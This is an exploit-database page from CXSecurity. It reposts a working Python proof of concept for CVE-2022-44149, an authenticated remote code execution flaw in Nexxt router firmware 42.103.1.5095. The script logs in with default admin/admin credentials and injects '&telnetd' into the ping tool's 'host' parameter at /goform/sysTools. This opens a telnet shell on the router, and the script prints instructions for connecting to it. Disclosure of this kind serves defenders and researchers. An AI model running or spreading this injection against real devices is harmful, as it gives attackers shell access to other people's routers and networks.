---
title: Nexxt Router Firmware 42.103.1.5095 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023010006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-06
fetch_date: 2025-10-04T03:07:15.217089
---

# Nexxt Router Firmware 42.103.1.5095 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Nexxt Router Firmware 42.103.1.5095 Remote Code Execution** **2023.01.05**  Credit:  **[Yerodin Richards](https://cxsecurity.com/author/Yerodin%2BRichards/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-44149](https://cxsecurity.com/cveshow/CVE-2022-44149/ "Click to see CVE-2022-44149")**  CWE: **N/A** | |

# Exploit Title: Nexxt Router Firmware 42.103.1.5095 - Remote Code Execution (RCE) (Authenticated)
# Date: 19/10/2022
# Exploit Author: Yerodin Richards
# Vendor Homepage: https://www.nexxtsolutions.com/
# Version: 42.103.1.5095
# Tested on: ARN02304U8
# CVE : CVE-2022-44149
import requests
import base64
router\_host = "http://192.168.1.1"
username = "admin"
password = "admin"
def main():
send\_payload("&telnetd")
print("connect to router using: `telnet "+router\_host.split("//")[1]+ "` using known credentials")
pass
def gen\_header(u, p):
return base64.b64encode(f"{u}:{p}".encode("ascii")).decode("ascii")
def send\_payload(payload):
url = router\_host+"/goform/sysTools"
headers = {"Authorization": "Basic {}".format(gen\_header(username, password))}
params = {"tool":"0", "pingCount":"4", "host": payload, "sumbit": "OK"}
requests.post(url, headers=headers, data=params)
if \_\_name\_\_ == '\_\_main\_\_':
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top